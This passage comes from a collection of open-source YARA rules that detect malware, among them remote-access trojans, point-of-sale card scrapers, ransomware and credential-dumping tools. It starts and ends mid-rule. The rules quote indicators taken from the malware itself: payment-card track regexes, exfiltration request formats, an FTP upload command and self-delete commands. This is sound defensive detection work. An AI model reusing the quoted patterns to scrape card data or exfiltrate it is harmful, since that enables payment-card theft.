		ref = "http://malwareconfig.com/stats/PoisonIvy"
		maltype = "Remote Access Trojan"
		filetype = "exe"

    strings:
    	$stub = {04 08 00 53 74 75 62 50 61 74 68 18 04}
        $string1 = "CONNECT %s:%i HTTP/1.0"
        $string2 = "ws2_32"
        $string3 = "cks=u"
        $string4 = "thj@h"
        $string5 = "advpack"
    condition:
		$stub at 0x1620 and all of ($string*) or (all of them)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/

rule Ponmocup : plugins 
{
 			meta: 
 					description = "Ponmocup plugin detection (memory)"
 					author = "Danny Heppener, Fox-IT"
 					reference = "https://foxitsecurity.files.wordpress.com/2015/12/foxit-whitepaper_ponmocup_1_1.pdf"
 			strings:
					 $1100 = {4D 5A 90 [29] 4C 04}
					 $1201 = {4D 5A 90 [29] B1 04}
					 $1300 = {4D 5A 90 [29] 14 05}
					 $1350 = {4D 5A 90 [29] 46 05}
					 $1400 = {4D 5A 90 [29] 78 05}
					 $1402 = {4D 5A 90 [29] 7A 05}
					 $1403 = {4D 5A 90 [29] 7B 05}
					 $1404 = {4D 5A 90 [29] 7C 05}
					 $1405 = {4D 5A 90 [29] 7D 05}
					 $1406 = {4D 5A 90 [29] 7E 05}
					 $1500 = {4D 5A 90 [29] DC 05}
					 $1501 = {4D 5A 90 [29] DD 05}
					 $1502 = {4D 5A 90 [29] DE 05}
					 $1505 = {4D 5A 90 [29] E1 05}
					 $1506 = {4D 5A 90 [29] E2 05}
					 $1507 = {4D 5A 90 [29] E3 05}
					 $1508 = {4D 5A 90 [29] E4 05}
					 $1509 = {4D 5A 90 [29] E5 05}
					 $1510 = {4D 5A 90 [29] E6 05}
					 $1511 = {4D 5A 90 [29] E7 05}
					 $1512 = {4D 5A 90 [29] E8 05}
					 $1600 = {4D 5A 90 [29] 40 06}
					 $1601 = {4D 5A 90 [29] 41 06}
					 $1700 = {4D 5A 90 [29] A4 06}
					 $1800 = {4D 5A 90 [29] 08 07}
					 $1801 = {4D 5A 90 [29] 09 07}
					 $1802 = {4D 5A 90 [29] 0A 07}
					 $1803 = {4D 5A 90 [29] 0B 07}
					 $2001 = {4D 5A 90 [29] D1 07}
					 $2002 = {4D 5A 90 [29] D2 07}
					 $2003 = {4D 5A 90 [29] D3 07}
					 $2004 = {4D 5A 90 [29] D4 07}
					 $2500 = {4D 5A 90 [29] C4 09}
					 $2501 = {4D 5A 90 [29] C5 09}
					 $2550 = {4D 5A 90 [29] F6 09}
					 $2600 = {4D 5A 90 [29] 28 0A}
					 $2610 = {4D 5A 90 [29] 32 0A}
					 $2700 = {4D 5A 90 [29] 8C 0A}
					 $2701 = {4D 5A 90 [29] 8D 0A}
					 $2750 = {4D 5A 90 [29] BE 0A}
					 $2760 = {4D 5A 90 [29] C8 0A}
					 $2810 = {4D 5A 90 [29] FA 0A}
 			condition:
 					 any of ($1100,$1201,$1300,$1350,$1400,$1402,$1403,$1404,$1405,$1406,
$1500,$1501,$1502,$1505,$1506,$1507,$1508,$1509,$1510,$1511,$1512,$1600,$1601,$1700,$1800,$1801,
$1802,$1803,$2001,$2002,$2003,$2004,$2500,$2501,$2550,$2600,$2610,$2700,$2701,$2750,$2760,$2810)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.
*/
rule pony {
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-08-16"
        description = "Identify Pony"
	strings:
    	$s1 = "{%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X}"
    	$s2 = "YUIPWDFILE0YUIPKDFILE0YUICRYPTED0YUI1.0"
    	$s3 = "POST %s HTTP/1.0"
    	$s4 = "Accept-Encoding: identity, *;q=0"

    	//$useragent1 = "Mozilla/4.0 (compatible; MSIE 5.0; Windows 98)"
    	//$useragent2 = "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/5.0)"
    condition:
        $s1 and $s2 and $s3 and $s4
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule BernhardPOS {
     meta:
          author = "Nick Hoffman / Jeremy Humble"
          last_update = "2015-07-14"
          source = "Morphick Inc."
          description = "BernhardPOS Credit Card dumping tool"
          reference = "http://morphick.com/blog/2015/7/14/bernhardpos-new-pos-malware-discovered-by-morphick"
          md5 = "e49820ef02ba5308ff84e4c8c12e7c3d"
          score = 70
     strings:
          $shellcode_kernel32_with_junk_code = { 33 c0 83 ?? ?? 83 ?? ?? 64 a1 30 00 00 00 83 ?? ?? 83 ?? ?? 8b 40 0c 83 ?? ?? 83 ?? ?? 8b 40 14 83 ?? ?? 83 ?? ?? 8b 00 ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? 8b 00 83 ?? ?? 83 ?? ?? 8b 40 10 83 ?? ?? }
          $mutex_name = "OPSEC_BERNHARD" 
          $build_path = "C:\\bernhard\\Debug\\bernhard.pdb" 
          $string_decode_routine = { 55 8b ec 83 ec 50 53 56 57 a1 ?? ?? ?? ?? 89 45 f8 66 8b 0d ?? ?? ?? ?? 66 89 4d fc 8a 15 ?? ?? ?? ?? 88 55 fe 8d 45 f8 50 ff ?? ?? ?? ?? ?? 89 45 f0 c7 45 f4 00 00 00 00 ?? ?? 8b 45 f4 83 c0 01 89 45 f4 8b 45 08 50 ff ?? ?? ?? ?? ?? 39 45 f4 ?? ?? 8b 45 08 03 45 f4 0f be 08 8b 45 f4 99 f7 7d f0 0f be 54 15 f8 33 ca 8b 45 08 03 45 f4 88 08 ?? ?? 5f 5e 5b 8b e5 5d }
     condition:
          any of them
 }
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as
    long as you use it under this license.
*/
rule easterjackpos {
    meta:
        author = "Brian Wallace @botnet_hunter"
        author_email = "bwall@ballastsecurity.net"
        date = "2014-09-02"
        description = "Identify JackPOS"
	strings:
	    $s1 = "updateinterval="
        $s2 = "cardinterval="
        $s3 = "{[!17!]}{[!18!]}"
    condition:
        all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"
rule LogPOS
{
    meta:
        author = "Morphick Security"
        description = "Detects Versions of LogPOS"
        md5 = "af13e7583ed1b27c4ae219e344a37e2b"
    strings:
        $mailslot = "\\\\.\\mailslot\\LogCC"
        $get = "GET /%s?encoding=%c&t=%c&cc=%I64d&process="
        //64A130000000      mov eax, dword ptr fs:[0x30]
        //8B400C        mov eax, dword ptr [eax + 0xc]
        //8B401C        mov eax, dword ptr [eax + 0x1c]
        //8B4008        mov eax, dword ptr [eax + 8]
        $sc = {64 A1 30 00 00 00 8B 40 0C 8B 40 1C 8B 40 08 }
    condition:
        $sc and 1 of ($mailslot,$get)
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule PoS_Malware_MalumPOS
{
    meta:
        author = "Trend Micro, Inc."
        date = "2015-05-25"
        description = "Used to detect MalumPOS memory dumper"
        sample_filtype = "exe"
    strings:
        $string1 = "SOFTWARE\\Borland\\Delphi\\RTL"
        $string2 = "B)[0-9]{13,19}\\"
        $string3 = "[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\"
        $string4 = "TRegExpr(exec): ExecNext Without Exec[Pos]"
        $string5 = /Y:\\PROGRAMS\\.{20,300}\.pas/ 
    condition:
        all of ($string*)
}        
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
// Point of Sale (POS) Malware and Tools used during POS compromises

rule blackpos_v2
{
meta:
	author = "@patrickrolsen"
	version = "0.1"
	reference = "http://blog.nuix.com/2014/09/08/blackpos-v2-new-variant-or-different-family"
strings:
	$s1 = "Usage: -[start|stop|install|uninstall"
	$s2 = "\\SYSTEM32\\sc.exe config LanmanWorkstation"
	$s3 = "t.bat"
	$s4 = "mcfmisvc"
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule dump_tool
{
meta:
	author = "@patrickrolsen"
	reference = "Related to pwdump6 and fgdump tools"
strings:
	$s1 = "lsremora"
	$s2 = "servpw"
	$s3 = "failed: %d"
	$s4 = "fgdump"
	$s5 = "fgexec"
	$s6 = "fgexecpipe"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule osql_tool
{
meta:
	author = "@patrickrolsen"
	reference = "O/I SQL - SQL query tool"
	filetype = "EXE"
	version = "0.1"
	date = "1/30/2014"
strings:
	$s1 = "osql\\src"
	$s2 = "OSQLUSER"
	$s3 = "OSQLPASSWORD"
	$s4 = "OSQLSERVER"
condition:
	uint16(0) == 0x5A4D and (all of ($s*))
}

rule misc_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS Malware"
strings:
	$s1 = "KAPTOXA"
	$s2 = "cmd /c net start %s"
	$s3 = "pid:"
	$s4 = "%ADD%"
	$s5 = "COMSPEC"
	$s6 = "KARTOXA"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule unknown
{
meta:
	author = "@patrickrolsen"
	reference = "Unknown POS"
strings:
	$s1 = "a.exe" wide
	$s2 = "Can anyone test" wide
	$s3 = "I m in computer class now" wide
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule regex_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS malware - Regex"
strings:
	$n1 = "REGEXEND" nocase
	$n2 = "RegExpr" nocase
	$n3 = "regex"
	$s4 = "[1-5][0-9]{14}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
	$s5 = "[47][0-9]{13}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
	$s6 = "(?:0[0-5]|[68][0-9])[0-9]{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
	$s7 = "(?:011|5[0-9]{2})[0-9]{12}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
	$s8 = "(?:2131|1800|35\\d{3})\\d{11}=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
	$s9 = "([0-9]{15,16}[D=](0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9]{8,30})"
	$s10 = "((b|B)[0-9]{13,19}\\^[A-Za-z\\s]{0,30}\\/[A-Za-z\\s]{0,30}\\^(0[7-9]|1[0-5])((0[1-9])|(1[0-2]))[0-9\\s]{3,50}[0-9]{1})"
	$s11 = "[0-9]*\\^[a-zA-Z]*/[a-zA-Z ]*\\^[0-9]*"
	$s12 = "\\d{15,19}=\\d{13,}"
	$s13 = "\\;?[3-9]{1}[0-9]{12,19}[D=\\u0061][0-9]{10,30}\\??"
	$s14 = "[0-9]{12}(?:[0-9]{3})?=(?!1201|1202|1203|1204|11|10|09|08|07|06|05|04|03|02)[0-9]{5}[0-9]*"
condition:
	uint16(0) == 0x5A4D and 1 of ($n*) and 1 of ($s*)
}

rule regexpr_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS malware - RegExpr"
strings:
	$s1 = "RegExpr" nocase
	$s2 = "Data.txt"
	$s3 = "Track1"
	$s4 = "Track2"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule reg_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS malware - RegExpr"
strings:
	$s1 = "T1_FOUND: %s"
	$s2 = "id=%s&log=%s"
	$s3 = "\\d{15,19}=\\d{13,}"
condition:
	uint16(0) == 0x5A4D and 2 of ($s*)
}

rule sets_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS malware - Sets"
strings:
	$s1 = "GET /sets.txt"
condition:
	uint16(0) == 0x5A4D and $s1
}

rule monitor_tool_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS malware - Monitoring Tool??"
strings:
	$s1 = "RCPT TO"
	$s2 = "MAIL FROM"
	$s3 = "AUTH LOGIN"
	$s4 = "Reply-To"
	$s5 = "X-Mailer"
	$s6 = "crypto"
	$s7 = "test335.txt" wide
	$s8 = "/c del"
condition:
	uint16(0) == 0x5A4D and 7 of ($s*)
}

rule pstgdump
{
meta:
	author = "@patrickrolsen"
	reference = "pstgdump"
strings:
	$s1 = "fgdump\\pstgdump"
	$s2 = "pstgdump"
	$s3 = "Outlook"
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule keyfinder_tool
{
meta:
	author = "@patrickrolsen"
	reference = "Magical Jelly Bean KeyFinder"
strings:
	$s1 = "chgxp.vbs"
	$s2 = "officekey.exe"
	$s3 = "findkey.exe"
	$s4 = "xpkey.exe"
condition:
	uint16(0) == 0x5A4D and 2 of ($s*)
}

rule memdump_diablo
{
meta:
	author = "@patrickrolsen"
	reference = "Process Memory Dumper - DiabloHorn"
strings:
	$s1 = "DiabloHorn"
	$s2 = "Process Memory Dumper"
	$s3 = "pid-%s.dmp"
	$s4 = "Pid %d in not acessible" // SIC
	$s5 = "memdump.exe"
	$s6 = "%s-%d.dmp"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule blazingtools
{
meta:
	author = "@patrickrolsen"
	reference = "Blazing Tools - http://www.blazingtools.com (Keyloggers)"
strings:
	$s1 = "blazingtools.com"
	$s2 = "Keystrokes" wide
	$s3 = "Screenshots" wide
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule sysocmgr
{
meta:
	author = "@patrickrolsen"
	reference = "System stand-alone Optional Component Manager - http://support.microsoft.com/kb/222444"
strings:
	$s1 = "SYSOCMGR.EXE" wide
	$s2 = "System stand-alone Optional Component Manager" wide
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule lacy_keylogger
{
meta:
	author = "@patrickrolsen"
	reference = "Appears to be a form of keylogger."
strings:
	$s1 = "Lacy.exe" wide
	$s2 = "Bldg Chive Duel Rip Query" wide
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule searchinject
{
meta:
	author = "@patrickrolsen"
	reference = "Usage: SearchInject <PID1>[PID2][PID3] - It loads Searcher.dll (appears to be hard coded)"
strings:
	$s1 = "SearchInject"
	$s2 = "inject base:"
	$s3 = "Searcher.dll" nocase
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule heistenberg_pos
{
meta:
	author = "@patrickrolsen"
	reference = "POS Malware"
strings:
	$s1 = "KARTOXA"
	$s2 = "dmpz.log"
	$s3 = "/api/process.php?xy="
	$s4 = "User-Agent: PCICompliant" // PCICompliant/3.33
	$s6 = "%s:*:Enabled:%s"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule pos_jack
{
meta:
	author = "@patrickrolsen"
	maltype = "Point of Sale (POS) Malware"
	version = "0.1"
	reference = "http://blog.spiderlabs.com/2014/02/jackpos-the-house-always-wins.html"
	date = "2/22/2014"
strings:
	$pdb1 = "\\ziedpirate.ziedpirate-PC\\"
	$pdb2 = "\\sop\\sop\\"
condition:
	uint16(0) == 0x5A4D and 1 of ($pdb*)
}

rule pos_memory_scrapper_
{
meta:
	author = "@patrickrolsen"
	maltype = "Point of Sale (POS) Malware Memory Scraper"
	version = "0.3"
	description = "POS Memory Scraper"
	date = "01/30/2014"
strings:
	$s1 = "kartoxa" nocase
	$s2 = "CC2 region:"
	$s3 = "CC memregion:"
	$s4 = "target pid:"
	$s5 = "scan all processes:"
	$s6 = "<pid> <PATTERN>"
	$s7 = "KAPTOXA"
	$s8 = "ATTERN"
	$s9 = "\\svhst%p"
condition:
	uint16(0) == 0x5A4D and 3 of ($s*)
}

rule pos_malwre_dexter_stardust
{
meta:
	author = "@patrickrolsen"
	maltype = "Dexter Malware - StarDust Variant"
	version = "0.1"
	description = "Table 2 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf"
	reference = "16b596de4c0e4d2acdfdd6632c80c070, 2afaa709ef5260184cbda8b521b076e1, and e3dd1dc82ddcfaf410372ae7e6b2f658"
	date = "12/30/2013"
strings:
	$s1 = "ceh_3\\.\\ceh_4\\..\\ceh_6"
	$s2 = "Yatoed3fe3rex23030am39497403"
	$s3 = "Poo7lo276670173quai16568unto1828Oleo9eds96006nosysump7hove19"
	$s4 = "CommonFile.exe"
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}
    
rule pos_malware_project_hook
{
meta:
	author = "@patrickrolsen"
	maltype = "Project Hook"
	version = "0.1"
	description = "Table 1 arbornetworks.com/asert/wp-content/uploads/2013/12/Dexter-and-Project-Hook-Break-the-Bank.pdf"
	reference = "759154d20849a25315c4970fe37eac59"
	date = "12/30/2013"
strings:
	$s1 = "CallImage.exe"
	$s2 = "BurpSwim"
	$s3 = "Work\\Project\\Load"
	$s4 = "WortHisnal"
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule pdb_strings_Rescator
{
meta:
	author = "@patrickrolsen"
	maltype = "Target Attack"
	version = "0.3"
	description = "Rescator PDB strings within binaries"
	date = "01/30/2014"
strings:
	$pdb1 = "\\Projects\\Rescator" nocase
condition:
	uint16(0) == 0x5A4D and $pdb1
}

rule pos_uploader
{
meta:
	author = "@patrickrolsen"
	maltype = "Point of Sale (POS) Malware"
    reference = "http://blogs.mcafee.com/mcafee-labs/analyzing-the-target-point-of-sale-malware"
	version = "0.1"
	description = "Testing the base64 encoded file in sys32"
	date = "01/30/2014"
strings:
	$s1 = "cmd /c net start %s"
	$s2 = "ftp -s:%s"
	$s3 = "data_%d_%d_%d_%d_%d.txt"
	$s4 = "\\uploader\\"
condition:
	uint16(0) == 0x5A4D and all of ($s*)
}

rule winxml_dll
{
meta:
	author = "@patrickrolsen"
	maltype = "Point of Sale (POS) Malware"
    reference = "ce0296e2d77ec3bb112e270fc260f274"
	version = "0.1"
	description = "Testing the base64 encoded file in sys32"
	date = "01/30/2014"
strings:
	$s1 = "\\system32\\winxml.dll"
	//$s2 = "cmd /c net start %s"
	//$s3 = "=== pid:"
	//$s4 = "GOTIT"
	//$s5 = ".memdump"
	//$s6 = "POSWDS"
condition:
	uint16(0) == 0x5A4D and (all of ($s*))
}

rule pos_chewbacca
{
meta:
	author = "@patrickrolsen"
	maltype = "Point of Sale (POS) Malware"
    reference = "https://www.securelist.com/en/blog/208214185/ChewBacca_a_new_episode_of_Tor_based_Malware"
    hashes = "21f8b9d9a6fa3a0cd3a3f0644636bf09, 28bc48ac4a92bde15945afc0cee0bd54"
	version = "0.2"
	description = "Testing the base64 encoded file in sys32"
	date = "01/30/2014"
strings:
	$s1 = "tor -f <torrc>"
	$s2 = "tor_"
	$s3 = "umemscan"
	$s4 = "CHEWBAC"
condition:
	uint16(0) == 0x5A4D and (all of ($s*))
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule PubSabCode : PubSab Family 
{
    meta:
        description = "PubSab code tricks"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $decrypt = { 6B 45 E4 37 89 CA 29 C2 89 55 E4 }
        
    condition:
        any of them
}

rule PubSabStrings : PubSab Family
{
    meta:
        description = "PubSab Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    strings:
        $ = "_deamon_init"
        $ = "com.apple.PubSabAgent"
        $ = "/tmp/screen.jpeg"
       
    condition:
        any of them
}

rule PubSab : Family
{
    meta:
        description = "PubSab"
        author = "Seth Hardy"
        last_modified = "2014-06-19"
        
    condition:
        PubSabCode or PubSabStrings
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule QuarianStrings : Quarian Family
{
    meta:
        description = "Quarian Identifying Strings"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
        
    strings:
        $ = "s061779s061750"
        $ = "[OnUpLoadFile]"
        $ = "[OnDownLoadFile]"
        $ = "[FileTransfer]"
        $ = "---- Not connect the Manager, so start UnInstall ----"
        $ = "------- Enter CompressDownLoadDir ---------"
        $ = "------- Enter DownLoadDirectory ---------"
        $ = "[HandleAdditionalData]"
        $ = "[mswsocket.dll]"
        $ = "msupdate.dll........Enter ThreadCmd!"
        $ = "ok1-1"
        $ = "msupdate_tmp.dll"
        $ = "replace Rpcss.dll successfully!"
        $ = "f:\\loadhiddendriver-mdl\\objfre_win7_x86\\i386\\intelnat.pdb"
        $ = "\\drivercashe\\" wide ascii
        $ = "\\microsoft\\windwos\\" wide ascii
        $ = "\\DosDevices\\LOADHIDDENDRIVER" wide ascii
        $ = "\\Device\\LOADHIDDENDRIVER" wide ascii
        $ = "Global\\state_maping" wide ascii
        $ = "E:\\Code\\2.0\\2.0_multi-port\\2.0\\ServerInstall_New-2010-0913_sp3\\msupdataDll\\Release\\msupdate_tmp.pdb"
        $ = "Global\\unInstall_event_1554_Ower" wide ascii
        
    condition:
       any of them
}

rule QuarianCode : Quarian Family 
{
    meta:
        description = "Quarian code features"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
    
    strings:
        // decrypt in intelnat.sys
        $ = { C1 E? 04 8B ?? F? C1 E? 05 33 C? }
        // decrypt in mswsocket.dll
        $ = { C1 EF 05 C1 E3 04 33 FB }
        $ = { 33 D8 81 EE 47 86 C8 61 }
        // loop in msupdate.dll
        $ = { FF 45 E8 81 45 EC CC 00 00 00 E9 95 FE FF FF }
    
    condition:
        any of them
}

rule Quarian : Family
{
    meta:
        description = "Quarian"
        author = "Seth Hardy"
        last_modified = "2014-07-09"
        
    condition:
        QuarianCode or QuarianStrings
}




/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule CryptoLocker_set1
{
meta:
	author = "Christiaan Beek, Christiaan_Beek@McAfee.com"
	date = "2014-04-13"
	description = "Detection of Cryptolocker Samples"
	
strings:
	$string0 = "static"
	$string1 = " kscdS"
	$string2 = "Romantic"
	$string3 = "CompanyName" wide
	$string4 = "ProductVersion" wide
	$string5 = "9%9R9f9q9"
	$string6 = "IDR_VERSION1" wide
	$string7 = "  </trustInfo>"
	$string8 = "LookFor" wide
	$string9 = ":n;t;y;"
	$string10 = "        <requestedExecutionLevel level"
	$string11 = "VS_VERSION_INFO" wide
	$string12 = "2.0.1.0" wide
	$string13 = "<assembly xmlns"
	$string14 = "  <trustInfo xmlns"
	$string15 = "srtWd@@"
	$string16 = "515]5z5"
	$string17 = "C:\\lZbvnoVe.exe" wide
condition:
	12 of ($string*)
}

rule CryptoLocker_rule2
{
meta:
	author = "Christiaan Beek, Christiaan_Beek@McAfee.com"
	date = "2014-04-14"
	description = "Detection of CryptoLocker Variants"
strings:
	$string0 = "2.0.1.7" wide
	$string1 = "    <security>"
	$string2 = "Romantic"
	$string3 = "ProductVersion" wide
	$string4 = "9%9R9f9q9"
	$string5 = "IDR_VERSION1" wide
	$string6 = "button"
	$string7 = "    </security>"
	$string8 = "VFileInfo" wide
	$string9 = "LookFor" wide
	$string10 = "      </requestedPrivileges>"
	$string11 = " uiAccess"
	$string12 = "  <trustInfo xmlns"
	$string13 = "last.inf"
	$string14 = " manifestVersion"
	$string15 = "FFFF04E3" wide
	$string16 = "3,31363H3P3m3u3z3"
condition:
	12 of ($string*)
}

rule SVG_LoadURL {
	meta:
		description = "Detects a tiny SVG file that loads an URL (as seen in CryptoWall malware infections)"
		author = "Florian Roth"
		reference = "http://goo.gl/psjCCc"
		date = "2015-05-24"
		hash1 = "ac8ef9df208f624be9c7e7804de55318"
		hash2 = "3b9e67a38569ebe8202ac90ad60c52e0"
		hash3 = "7e2be5cc785ef7711282cea8980b9fee"
		hash4 = "4e2c6f6b3907ec882596024e55c2b58b"
		score = 50
	strings:
		$s1 = "</svg>" nocase
		$s2 = "<script>" nocase
		$s3 = "location.href='http" nocase
	condition:
		all of ($s*) and filesize < 600
}
rule BackdoorFCKG: CTB_Locker_Ransomware
{
meta:
author = "ISG"
date = "2015-01-20"
reference = "https://blogs.mcafee.com/mcafee-labs/rise-backdoor-fckq-ctb-locker"
description = "CTB_Locker"

strings:
$string0 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
$stringl = "RNDBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" 
$string2 = "keme132.DLL" 
$string3 = "klospad.pdb" 
condition:
3 of them 
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/
rule sakula_v1_0
{
    meta:
        description = "Sakula v1.0"
        date = "2015-10-13"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
    strings:
        $m1 = "%d_of_%d_for_%s_on_%s"
        $m2 = "/c ping 127.0.0.1 & del /q \"%s\""
        $m3 = "=%s&type=%d"
        $m4 = "?photoid="
        $m5 = "iexplorer"
                $m6 = "net start \"%s\""
        $v1_1 = "MicroPlayerUpdate.exe"
        $MZ = "MZ"
    condition:
        $MZ at 0 and all of ($m*) and not $v1_1
}

rule sakula_v1_1
{
    meta:
        description = "Sakula v1.1"
        date = "2015-10-13"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
    strings:
        $m1 = "%d_of_%d_for_%s_on_%s"
        $m2 = "/c ping 127.0.0.1 & del /q \"%s\""
        $m3 = "=%s&type=%d"
        $m4 = "?photoid="
        $m5 = "iexplorer"
                $m6 = "net start \"%s\""
        $v1_1 = "MicroPlayerUpdate.exe"
        $MZ = "MZ"
    condition:
        $MZ at 0 and all of them
}

rule sakula_v1_2
{
    meta:
        description = "Sakula v1.2"
        date = "2015-10-13"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
    strings:
        $m1 = "%d_of_%d_for_%s_on_%s"
        $m2 = "/c ping 127.0.0.1 & del /q \"%s\""
        $m3 = "cmd.exe /c rundll32 \"%s\""
        $v1_1 = "MicroPlayerUpdate.exe"
        $v1_2 = "CCPUpdate"

        $MZ = "MZ"
    condition:
        $MZ at 0 and $m1 and $m2 and $m3 and $v1_2 and not $v1_1
}

rule sakula_v1_3
{
    meta:
        description = "Sakula v1.3"
        date = "2015-10-13"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
    strings:
        $m1 = "%d_of_%d_for_%s_on_%s"
        $m2 = "/c ping 127.0.0.1 & del /q \"%s\""
        $m3 = "cmd.exe /c rundll32 \"%s\""

        $v1_3 = { 81 3E 78 03 00 00 75 57  8D 54 24 14 52 68 0C 05 41 00 68 01 00 00 80 FF  15 00 F0 40 00 85 C0 74 10 8B 44 24 14 68 2C 31  41 00 50 FF 15 10 F0 40 00 8B 4C 24 14 51 FF 15  24 F0 40 00 E8 0F 09 00 }

        $MZ = "MZ"
    condition:
        $MZ at 0 and all of them
}

rule sakula_v1_4
{
    meta:
        description = "Sakula v1.4"
        date = "2015-10-13"
        author = "Airbus Defence and Space Cybersecurity CSIRT - Yoann Francou"
    strings:
        $m1 = "%d_of_%d_for_%s_on_%s"
        $m2 = "/c ping 127.0.0.1 & del /q \"%s\""
        $m3 = "cmd.exe /c rundll32 \"%s\""

        $v1_4 = { 50 E8 CD FC FF FF 83 C4  04 68 E8 03 00 00 FF D7 56 E8 54 12 00 00 E9 AE  FE FF FF E8 13 F5 FF FF }

        $MZ = "MZ"
    condition:
        $MZ at 0 and all of them
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"


rule TerminatorRat : rat 
{
	meta:
		description = "Terminator RAT" 
		author = "Jean-Philippe Teissier / @Jipe_"
		date = "2013-10-24"
		filetype = "memory"
		version = "1.0" 
		ref1 = "http://www.fireeye.com/blog/technical/malware-research/2013/10/evasive-tactics-terminator-rat.html" 

	strings:
		$a = "Accelorator"
		$b = "<html><title>12356</title><body>"

	condition:
		all of them
}



rule TROJAN_Notepad_shell_crew {
        meta:
                author = "RSA_IR"
                Date     = "4Jun13"
                File     = "notepad.exe v 1.1"
                MD5      = "106E63DBDA3A76BEEB53A8BBD8F98927"
        strings:
                $s1 = "75BAA77C842BE168B0F66C42C7885997"
                $s2 = "B523F63566F407F3834BCC54AAA32524"
        condition:
                $s1 or $s2
}
/*
    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.

*/

import "pe"

rule RCS_Backdoor
{
    meta:
        description = "Hacking Team RCS Backdoor"
	author = "botherder https://github.com/botherder"

    strings:
        $filter1 = "$debug3"
        $filter2 = "$log2"
        $filter3 = "error2"

        $debug1 = /\- (C)hecking components/ wide ascii
        $debug2 = /\- (A)ctivating hiding system/ wide ascii
        $debug3 = /(f)ully operational/ wide ascii

        $log1 = /\- Browser activity \(FF\)/ wide ascii
        $log2 = /\- Browser activity \(IE\)/ wide ascii
        
        // Cause false positives.
        //$log3 = /\- About to call init routine at %p/ wide ascii
        //$log4 = /\- Calling init routine at %p/ wide ascii

        $error1 = /\[Unable to deploy\]/ wide ascii
        $error2 = /\[The system is already monitored\]/ wide ascii

    condition:
